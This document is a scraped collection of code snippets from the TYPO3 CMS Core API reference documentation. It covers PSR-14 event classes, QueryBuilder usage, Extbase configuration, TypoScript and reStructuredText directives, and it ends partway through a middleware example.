https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/Resource/AfterFileCopiedEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nphp:method:: getFile()\n:returns: `\\TYPO3\\CMS\\Core\\Resource\\FileInterface`\n\nphp:method:: getFolder()\n:returns: `\\TYPO3\\CMS\\Core\\Resource\\Folder`\n\nphp:method:: getNewFileIdentifier()\n:returns: `string`\n\nphp:method:: getNewFile()\n:returns: `?\\TYPO3\\CMS\\Core\\Resource\\FileInterface`\n```\n\n----------------------------------------\n\nTITLE: Module Retrieval Method\nDESCRIPTION: Method to retrieve a specific module by identifier with optional user authentication and workspace restriction checks.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Manual/Backend/ModuleProvider.rst.txt#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\nphp:method:: getModule(string $identifier, ?\\TYPO3\\CMS\\Core\\Authentication\\BackendUserAuthentication $user = NULL, bool $respectWorkspaceRestrictions = true)\n:returns: `?\\TYPO3\\CMS\\Backend\\Module\\ModuleInterface`\n```\n\n----------------------------------------\n\nTITLE: Defining AfterObjectThawedEvent Class in PHP for TYPO3 CMS Extbase\nDESCRIPTION: This code snippet defines the AfterObjectThawedEvent class in the TYPO3\\CMS\\Extbase\\Event\\Persistence namespace. The event allows modification of domain object values during the hydration process.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Extbase/Persistence/AfterObjectThawedEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nfinal class AfterObjectThawedEvent\n{\n    public function __construct(\n        private readonly object $object,\n        private array $objectData\n    ) {\n    }\n\n    public function getObject(): object\n    {\n        return $this->object;\n    }\n\n    public function getObjectData(): array\n    {\n        return $this->objectData;\n    }\n\n    public function setObjectData(array $objectData): void\n    {\n        $this->objectData = $objectData;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Enetcache Unit Test Example in PHP\nDESCRIPTION: Sample unit test for the Enetcache extension using TYPO3's Testing Framework, demonstrating basic test structure and method definition\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Testing/Tutorial/Enetcache.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n<?php\nnamespace Lolli\\Enetcache\\Tests\\Unit\\Hooks;\n\nuse TYPO3\\TestingFramework\\Core\\Unit\\UnitTestCase;\n\nclass DataHandlerFlushByTagHookTest extends UnitTestCase\n{\n    /**\n     * @test\n     */\n    public function findReferencedDatabaseEntriesReturnsEmptyArrayForTcaWithoutRelations()\n    {\n        // some unit test code\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Displaying Multi-Site Page Tree Structure in TYPO3\nDESCRIPTION: This code snippet illustrates a page tree structure for a multi-site setup in TYPO3. It shows how a mount point on one site can reference a page from another site.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/MountPoints/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: none\nCODE:\n```\nPage   Tree\n====== ====================\n\n1      Site 1: example.org\n2      └── Company              <- mounted by page 5\n3          └── About us\n\n4      Site 2: company.example.org\n5      └── Cross site mount     <- mount point page that is mounting page 2\n```\n\n----------------------------------------\n\nTITLE: RST Include and Index Directives\nDESCRIPTION: RST directives for including common definitions and creating an index entry for install events.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Install/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n..  include:: /Includes.rst.txt\n..  index:: pair: Events; install\n..  _eventlist-install:\n```\n\n----------------------------------------\n\nTITLE: Defining additional.php File\nDESCRIPTION: This snippet describes the additional.php file and its role in overriding settings from settings.php. It is to be used with caution since it is not managed by TYPO3 tools, which might affect system upgrades.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/ConfigurationFiles.rst#2025-04-16_snippet_1\n\nLANGUAGE: reStructuredText\nCODE:\n```\n..  typo3:file:: additional.php\n    :scope: project\n    :composerPath: config/system/\n    :classicPath: typo3conf/system/\n    :regex: /^(.*\\/config\\/system\\/additional\\.php|.*\\/typo3conf\\/system\\/additional\\.php|additional\\.php)$/\n    :shortDescription: Contains system wide settings. Overrides settings.php and is not touched by TYPO3.\n\n    The settings in the :file:`settings.php`  can be overridden in the\n    :file:`additional.php` file, which is never touched by TYPO3\n    internal management tools. Be aware that having settings within\n    :file:`additional.php` may prevent the system from performing\n    automatic upgrades and should be used with care and only if you know what\n    you are doing.\n```\n\n----------------------------------------\n\nTITLE: Setting Identifier in AfterFlexFormDataStructureIdentifierInitializedEvent\nDESCRIPTION: This method allows modification or complete replacement of the initialized data structure identifier.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/AfterFlexFormDataStructureIdentifierInitializedEvent.rst.txt#2025-04-16_snippet_5\n\nLANGUAGE: PHP\nCODE:\n```\nphp:method:: setIdentifier(array $identifier)\n\n    :param $identifier: the identifier\n```\n\n----------------------------------------\n\nTITLE: Configuring Basic Crop Variants for tt_content Images in TYPO3\nDESCRIPTION: Example configuration for adding custom crop variants to the image field of tt_content records. Defines a mobile crop variant with specific area dimensions.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/CropVariants/ContentElement/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n'config' => [\n    'overrideChildTca' => [\n        'columns' => [\n            'crop' => [\n                'config' => [\n                    'cropVariants' => [\n                        'mobile' => [\n                            'title' => 'LLL:EXT:ext_key/Resources/Private/Language/locallang.xlf:imageManipulation.mobile',\n                            'cropArea' => [\n                                'x' => 0.1,\n                                'y' => 0.1,\n                                'width' => 0.8,\n                                'height' => 0.8,\n                            ],\n                        ],\n                    ],\n                ],\n            ],\n        ],\n    ],\n]\n```\n\n----------------------------------------\n\nTITLE: Ensuring DateTime Validity with Extbase\nDESCRIPTION: The DateTimeValidator verifies that a field holds a valid DateTimeInterface object. This ensures time-based fields like start dates or timestamps are valid DateTime objects. There are no specific dependencies, making it a straightforward choice for time validation in models.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Extbase/Reference/Validation/Validators/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: PHP\nCODE:\n```\n#[Validate(['validator' => 'DateTime'])]\nprotected mixed $startDate;\n```\n\n----------------------------------------\n\nTITLE: RST Include and Index Directives\nDESCRIPTION: RST directives for including common definitions and setting up index entries for Crowdin and Localization topics.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Localization/TranslationServer/Crowdin.rst#2025-04-16_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n..  include:: /Includes.rst.txt\n..  index::\n    Localization; Crowdin\n    Crowdin\n..  _xliff-translating-server-crowdin:\n```\n\n----------------------------------------\n\nTITLE: Installing a Local TYPO3 Extension via Composer\nDESCRIPTION: Command to install a local TYPO3 extension using Composer, specifying the development version with the @dev constraint.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/HowTo/CreateNewExtension.rst#2025-04-16_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\ncomposer req my-vendor/my-extension:\"@dev\"\n```\n\n----------------------------------------\n\nTITLE: Cache Data Collector Class Methods Declaration\nDESCRIPTION: Class method declarations for CacheDataCollector showing the API for managing cache tags, cache lifetime, and cache entries. Includes method signatures with parameter and return type definitions.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Manual/Cache/CacheDataCollector.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Core\\Cache;\n\nclass CacheDataCollector {\n    public function getCacheTags(): array\n    \n    public function addCacheTags(CacheTag ...$cacheTags)\n    \n    public function removeCacheTags(CacheTag ...$cacheTags)\n    \n    public function restrictMaximumLifetime(int $lifetime)\n    \n    public function resolveLifetime(): int\n    \n    public function enqueueCacheEntry(CacheEntry $deferredCacheItem)\n    \n    public function getCacheEntries(): array\n}\n```\n\n----------------------------------------\n\nTITLE: Defining AfterFileReplacedEvent Class in PHP for TYPO3 CMS\nDESCRIPTION: This snippet defines the AfterFileReplacedEvent class in the TYPO3\\CMS\\Core\\Resource\\Event namespace. The class provides methods to retrieve the replaced file and its local file path. It is used for post-processing after file replacement, such as creating variants or indexing file contents.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/Resource/AfterFileReplacedEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Core\\Resource\\Event;\n\nclass AfterFileReplacedEvent\n{\n    public function getFile(): \\TYPO3\\CMS\\Core\\Resource\\FileInterface\n    {\n        // Implementation not shown\n    }\n\n    public function getLocalFilePath(): string\n    {\n        // Implementation not shown\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: PHP Class Definition for TYPO3 Frontend Caching Event\nDESCRIPTION: Defines the AfterCacheableContentIsGeneratedEvent class with methods for managing content caching behavior and request handling in TYPO3 CMS Frontend. The class provides functionality to enable/disable caching and retrieve request/controller information.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Frontend/AfterCacheableContentIsGeneratedEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Frontend\\Event;\n\nclass AfterCacheableContentIsGeneratedEvent {\n    public function getRequest(): \\Psr\\Http\\Message\\ServerRequestInterface;\n    public function getController(): \\TYPO3\\CMS\\Frontend\\Controller\\TypoScriptFrontendController;\n    public function isCachingEnabled(): bool;\n    public function disableCaching(): void;\n    public function enableCaching(): void;\n    public function getCacheIdentifier(): string;\n}\n```\n\n----------------------------------------\n\nTITLE: Fetching All Results at Once with fetchAllAssociative() in TYPO3 PHP\nDESCRIPTION: Example of using fetchAllAssociative() to retrieve all database results at once as an array. This is convenient but less memory-efficient for large result sets compared to fetchAssociative().\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/Statement/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n// use TYPO3\\CMS\\Core\\Database\\Connection;\n// Fetch all records from tt_content on page 42\n$queryBuilder = $this->connectionPool->getQueryBuilderForTable('tt_content');\n$rows = $queryBuilder\n    ->select('uid', 'bodytext')\n    ->from('tt_content')\n    ->where(\n        $queryBuilder->expr()->eq(\n            'pid',\n            $queryBuilder->createNamedParameter(42, Connection::PARAM_INT)\n        )\n    )\n    ->executeQuery()\n    ->fetchAllAssociative();\n```\n\n----------------------------------------\n\nTITLE: Defining AfterFileContentsSetEvent Class in PHP for TYPO3 CMS\nDESCRIPTION: This code snippet defines the AfterFileContentsSetEvent class, which is triggered after file contents are set in TYPO3 CMS. It includes properties for the file object and the file contents, along with getter methods.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/Resource/AfterFileContentsSetEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nfinal class AfterFileContentsSetEvent\n{\n    public function __construct(\n        private readonly FileInterface $file,\n        private readonly string $content\n    ) {\n    }\n\n    public function getFile(): FileInterface\n    {\n        return $this->file;\n    }\n\n    public function getContent(): string\n    {\n        return $this->content;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Configure Extbase Plugin in ext_localconf.php (Excerpt)\nDESCRIPTION: This is an example snippet from `ext_localconf.php` showing how to add the BlogController to the allowed controllers of a plugin.  This complements the prior snippet, demonstrating a more complete configuration.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Extbase/Reference/Controller/ActionController.rst#2025-04-16_snippet_5\n\nLANGUAGE: php\nCODE:\n```\n<?php\n\nuse TYPO3\\CMS\\Extbase\\Utility\\ExtensionUtility;\n\nExtensionUtility::configurePlugin(\n    'BlogExample',\n    'Pi1',\n    [\n        \\Vendor\\Extension\\Controller\\BlogController::class => 'index',\n        \\Vendor\\Extension\\Controller\\PostController::class => 'index',\n        \\Vendor\\Extension\\Controller\\CommentController::class => 'index',\n    ],\n    // non-cacheable actions\n    []\n);\n```\n\n----------------------------------------\n\nTITLE: Including RST Documentation Header\nDESCRIPTION: ReStructuredText directives for including common definitions and setting up documentation structure for TYPO3 security events.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/Security/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n..  include:: /Includes.rst.txt\n..  index:: pair: Events; Core Security\n..  _eventlist-core-security:\n\n\n========\nSecurity\n========\n\nThe following list contains :ref:`PSR-14 events <EventDispatcher>`\nin EXT:core, namespace Security.\n\n**Contents:**\n\n..  toctree::\n    :titlesonly:\n    :glob:\n\n    *\n```\n\n----------------------------------------\n\nTITLE: Defining AfterFileContentsSetEvent Class in TYPO3 CMS Core Resource\nDESCRIPTION: This snippet defines the AfterFileContentsSetEvent class in the TYPO3\\CMS\\Core\\Resource\\Event namespace. The class provides methods to access the file and its content after the file contents have been set or replaced.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/Resource/AfterFileContentsSetEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n..  php:namespace::  TYPO3\\CMS\\Core\\Resource\\Event\n\n..  php:class:: AfterFileContentsSetEvent\n\n    This event is fired after the contents of a file got set / replaced.\n\n    Examples: Listeners can analyze content for AI purposes within Extensions.\n\n    ..  php:method:: getFile()\n        :returns: `\\TYPO3\\CMS\\Core\\Resource\\FileInterface`\n\n    ..  php:method:: getContent()\n        :returns: `string`\n```\n\n----------------------------------------\n\nTITLE: Configuring user.tsconfig in TYPO3 extension\nDESCRIPTION: This code snippet demonstrates how to configure `user.tsconfig` file to disable prepending at copy for pages in TYPO3. The configuration resides in `EXT:my_extension/Configuration/user.tsconfig` and affects the TCEMAIN settings for the pages table.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/FileStructure/Configuration/UserTsconfig.rst#2025-04-16_snippet_0\n\nLANGUAGE: typoscript\nCODE:\n```\npage.TCEMAIN.table.pages.disablePrependAtCopy = 1\n```\n\n----------------------------------------\n\nTITLE: Including TypoScript Setup - TYPO3 RST\nDESCRIPTION: This snippet defines the configuration for including TypoScript setup for TYPO3 extensions. It specifies a regular expression for file identification and includes the TypoScript in the TYPO3 setup section. This is intended for installations not using site sets and ensures backward compatibility.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/FileStructure/ExtTyposcriptSetupTyposcript.rst#2025-04-16_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n..  typo3:file:: ext_typoscript_setup.typoscript\n    :scope: extension\n    :regex: /^.*ext\\_typoscript\\_setup\\.(typoscript|txt|ts)$/\n    :shortDescription: Preset TypoScript setup for sites without site sets\n```\n\n----------------------------------------\n\nTITLE: Sorting Driver Middlewares with Before and After in TYPO3\nDESCRIPTION: Shows how to use the before and after properties to control the execution order of Doctrine DBAL driver middlewares in a TYPO3 application.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/Middleware/Index.rst#2025-04-16_snippet_5\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['DB']['globalMiddlewares'] = array_merge(\n    $GLOBALS['TYPO3_CONF_VARS']['DB']['globalMiddlewares'] ?? [],\n    [\n        'logging-middleware' => [\n            'target' => \\Vendor\\Extension\\Driver\\LoggingMiddleware::class,\n            'after' => [\n                'typo3/core/custom-platform-driver-middleware',\n                'typo3/core/custom-pdo-driver-result-middleware',\n            ],\n        ],\n        'another-middleware' => [\n            'target' => \\Vendor\\Extension\\Driver\\AnotherMiddleware::class,\n            'after' => ['typo3/core/custom-platform-driver-middleware'],\n            'before' => ['logging-middleware'],\n        ],\n    ]\n);\n```\n\n----------------------------------------\n\nTITLE: Implementing AfterLinkResolvedByStringRepresentationEvent Listener in PHP\nDESCRIPTION: Example implementation of an event listener for AfterLinkResolvedByStringRepresentationEvent. This listener can modify link resolution results or handle custom link types in TYPO3's LinkService.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/LinkHandling/AfterLinkResolvedByStringRepresentationEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\n\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\LinkHandling\\EventListener;\n\nuse TYPO3\\CMS\\Core\\LinkHandling\\Event\\AfterLinkResolvedByStringRepresentationEvent;\n\nfinal class MyEventListener\n{\n    public function __invoke(AfterLinkResolvedByStringRepresentationEvent $event): void\n    {\n        // Example code for handling link resolution\n        $resolvedLink = $event->getResolvedLink();\n        // Add custom link handling logic here\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Handling Composer Validation Warnings\nDESCRIPTION: This snippet represents a deprecated method of using 'ext_key' in the 'replace' section of composer.json, which is incompatible with Composer version 2.0+. Using this will trigger warnings during 'composer validate' and is advised against in future deployments.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/FileStructure/ComposerJson.rst#2025-04-16_snippet_4\n\nLANGUAGE: json\nCODE:\n```\n{\n    \"replace\": {\n        \"ext_key\": \"self.version\"\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Structuring TYPO3 Services Documentation with reStructuredText\nDESCRIPTION: This snippet defines the structure of the TYPO3 Services documentation using reStructuredText directives. It includes a table of contents and references to other documentation files.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Services/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: reStructuredText\nCODE:\n```\n.. include:: /Includes.rst.txt\n.. _services:\n\n========\nServices\n========\n\n**Contents:**\n\n.. toctree::\n   :titlesonly:\n\n   Introduction/Index\n   UsingServices/Index\n   Configuration/Index\n   Developer/Index\n```\n\n----------------------------------------\n\nTITLE: Defining the AfterLinkIsGeneratedEvent Class in TYPO3 Frontend\nDESCRIPTION: Documentation for the AfterLinkIsGeneratedEvent class that allows modification of links generated with typolink(). The class includes methods to update the link result, retrieve the link result, get the content object renderer, and access the original link instructions.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Frontend/AfterLinkIsGeneratedEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Frontend\\Event;\n\nclass AfterLinkIsGeneratedEvent\n{\n    public function setLinkResult(\\TYPO3\\CMS\\Frontend\\Typolink\\LinkResultInterface $linkResult)\n    {\n        // Update a link when a part was modified by an Event Listener.\n    }\n    \n    public function getLinkResult()\n    {\n        // Returns: \\TYPO3\\CMS\\Frontend\\Typolink\\LinkResultInterface\n    }\n    \n    public function getContentObjectRenderer()\n    {\n        // Returns: \\TYPO3\\CMS\\Frontend\\ContentObject\\ContentObjectRenderer\n    }\n    \n    public function getLinkInstructions()\n    {\n        // Returns: array\n        // Returns the original instructions / $linkConfiguration that were used to build the link\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Custom SEL Functions\nDESCRIPTION: Implementation of a custom function provider with a webservice function example.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/SymfonyExpressionLanguage/Index.rst#2025-04-16_snippet_4\n\nLANGUAGE: php\nCODE:\n```\nnamespace Vendor\\SomeExtension\\TypoScript;\n\nuse Symfony\\Component\\ExpressionLanguage\\ExpressionFunction;\nuse Symfony\\Component\\ExpressionLanguage\\ExpressionFunctionProviderInterface;\n\nclass CustomConditionFunctionsProvider implements ExpressionFunctionProviderInterface\n{\n    public function getFunctions()\n    {\n        return [\n            $this->getWebserviceFunction(),\n        ];\n    }\n\n    protected function getWebserviceFunction(): ExpressionFunction\n    {\n        return new ExpressionFunction(\n            'webservice',\n            static fn () => null, // Not implemented, we only use the evaluator\n            static function ($arguments, $endpoint, $uid) {\n                return GeneralUtility::getUrl(\n                    'https://example.org/endpoint/'\n                    . $endpoint\n                    . '/'\n                    . $uid\n                );\n            }\n        );\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining External Program Dependencies for TYPO3 Services\nDESCRIPTION: Example showing how to specify external program dependencies for TYPO3 services using the exec parameter.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Services/Developer/Implementing.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n'exec' => 'perl',\n\n'exec' => 'pdftotext',\n```\n\n----------------------------------------\n\nTITLE: Registering Command with PHP Attribute\nDESCRIPTION: Using the Symfony\\Component\\Console\\Attribute\\AsCommand PHP attribute to register a TYPO3 console command with a name, description and aliases.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/CommandControllers/Tutorial.rst#2025-04-16_snippet_3\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace T3docs\\Examples\\Command;\n\nuse Symfony\\Component\\Console\\Attribute\\AsCommand;\nuse Symfony\\Component\\Console\\Command\\Command;\nuse Symfony\\Component\\Console\\Input\\InputInterface;\nuse Symfony\\Component\\Console\\Output\\OutputInterface;\n\n// Register command with name and description, optional parameter aliases\n#[AsCommand(\n    name: 'examples:dosomething',\n    description: 'A command that does nothing and always succeeds.',\n    aliases: ['examples:dosomethingalias']\n)]\nfinal class DoSomethingCommand extends Command\n{\n    /**\n     * Configure the command by defining the name, options and arguments\n     */\n    protected function configure(): void\n    {\n        $this->setHelp('Outputs nothing, but returns silently.');\n    }\n\n    /**\n     * Executes the command\n     */\n    protected function execute(InputInterface $input, OutputInterface $output): int\n    {\n        return Command::SUCCESS;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Executing UPDATE Query with Field-to-Field Assignment in TYPO3 CMS\nDESCRIPTION: Shows how to update a field with the value of another field using the QueryBuilder. It demonstrates turning off automatic quoting and using quoteIdentifier().\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/QueryBuilder/Index.rst#2025-04-16_snippet_13\n\nLANGUAGE: PHP\nCODE:\n```\n// use TYPO3\\CMS\\Core\\Database\\Connection;\n\n// UPDATE `tt_content` SET `bodytext` = `header` WHERE `bodytext` = 'lorem'\n$queryBuilder = $this->connectionPool->getQueryBuilderForTable('tt_content');\n$queryBuilder\n    ->update('tt_content')\n    ->where(\n        $queryBuilder->expr()->eq('bodytext', $queryBuilder->createNamedParameter('lorem', Connection::PARAM_STR))\n    )\n    ->set('bodytext', $queryBuilder->quoteIdentifier('header'), false)\n    ->executeStatement();\n```\n\n----------------------------------------\n\nTITLE: Configuring TYPO3 Identifiers with Escaping in Typoscript\nDESCRIPTION: This snippet shows how to assign a value to an identifier in TYPO3 using Typoscript, highlighting the method of escaping dots in the identifier names. It is important for maintaining the proper naming conventions when dots are part of the identifier. No external dependencies are required for this example.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/TypoScriptSyntax/Identifiers2.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: typoscript\nCODE:\n```\nmyIdentifier.my\\.identifier\\.with\\.dots = myValue\n```\n\n----------------------------------------\n\nTITLE: Configuring 'connect_timeout' in TYPO3\nDESCRIPTION: This snippet illustrates how to configure the 'connect_timeout' option for HTTP requests in TYPO3. This option sets the default timeout (in seconds) for establishing a connection to a remote host. An exception will be thrown if connecting to the remote host takes longer than the specified timeout.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/Typo3ConfVars/HTTP.rst#2025-04-16_snippet_3\n\nLANGUAGE: PHP\nCODE:\n```\n\"$GLOBALS['TYPO3_CONF_VARS']['HTTP']['connect_timeout']\"\n```\n\n----------------------------------------\n\nTITLE: Configuring 'timeout' in TYPO3\nDESCRIPTION: This snippet describes the 'timeout' option for HTTP requests in TYPO3, which sets the default timeout (in seconds) for the entire request. An exception is thrown if the request takes longer than this timeout to complete. It should be greater than the connection timeout or set to 0 to disable the limit.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/Typo3ConfVars/HTTP.rst#2025-04-16_snippet_6\n\nLANGUAGE: PHP\nCODE:\n```\n\"$GLOBALS['TYPO3_CONF_VARS']['HTTP']['timeout']\"\n```\n\n----------------------------------------\n\nTITLE: Defining Post Model Class with Comment Storage in TYPO3\nDESCRIPTION: A PHP class definition for a blog post model that extends AbstractEntity and implements Stringable interface. It includes an ObjectStorage property for managing post comments using TYPO3's Extbase persistence layer.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Extbase/Domain/Relationship1onNUni.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nuse TYPO3\\CMS\\Extbase\\Persistence\\ObjectStorage;\n\nclass Post extends AbstractEntity implements \\Stringable\n{\n    /**\n     * @var ?ObjectStorage<Comment>\n     */\n    public ?ObjectStorage $comments = null;\n}\n```\n\n----------------------------------------\n\nTITLE: Adding a Standard DropDown Item to TYPO3 Dropdown Button\nDESCRIPTION: This example shows how to add a standard item to a dropdown button in TYPO3 backend. The dropdown item can be configured with a tag, href, label, title, icon, and custom attributes.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/ButtonComponents.rst#2025-04-16_snippet_4\n\nLANGUAGE: php\nCODE:\n```\nuse TYPO3\\CMS\\Backend\\Template\\Components\\Buttons\\DropDown\\DropDownHeader:\n\n$item = GeneralUtility::makeInstance(DropDownItem::class)\n    ->setTag('a')\n    ->setHref('#')\n    ->setLabel('My label')\n    ->setTitle('My title')\n    ->setIcon($this->iconFactory->getIcon('actions-heart'))\n    ->setAttributes(['data-value' => '123']);\n$dropDownButton->addItem($item);\n```\n\n----------------------------------------\n\nTITLE: Defining AfterFileAddedEvent Class Methods\nDESCRIPTION: PHP class definition for AfterFileAddedEvent with two methods: getFile() which returns a FileInterface object, and getFolder() which returns a Folder object. This event class is used for post-processing files after they are added to TYPO3's Resource Storage.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/Resource/AfterFileAddedEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Core\\Resource\\Event;\n\nclass AfterFileAddedEvent {\n    public function getFile(): \\TYPO3\\CMS\\Core\\Resource\\FileInterface;\n    public function getFolder(): \\TYPO3\\CMS\\Core\\Resource\\Folder;\n}\n```\n\n----------------------------------------\n\nTITLE: Defining AfterContentHasBeenFetchedEvent Class in TYPO3 CMS Frontend\nDESCRIPTION: This code snippet defines the AfterContentHasBeenFetchedEvent class in the TYPO3\\CMS\\Frontend\\Event namespace. The class contains two public attributes: groupedContent which can be manipulated by event listeners, and request which is read-only.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Frontend/AfterContentHasBeenFetchedEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n..  php:namespace::  TYPO3\\CMS\\Frontend\\Event\n\n..  php:class:: AfterContentHasBeenFetchedEvent\n\n    Event listeners are able to manipulate fetched page content, which is already grouped by column\n\n    ..  php:attr:: groupedContent\n        :public:\n\n    ..  php:attr:: request\n        :readonly:\n        :public:\n```\n\n----------------------------------------\n\nTITLE: Implementing PSR-15 Middleware with PSR-18 HTTP Client in TYPO3\nDESCRIPTION: This example shows a middleware that uses PSR-18 HTTP Client to request an external service, transforms the response, and returns a new response. It demonstrates the use of PSR-17 Request Factory and PSR-7 Response Factory.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/RequestLifeCycle/Middlewares.rst#2025-04-16_snippet_7\n\nLANGUAGE: PHP\nCODE:\n```\n..  literalinclude:: _Middlewares/_ExampleMiddleware.php\n    :caption: 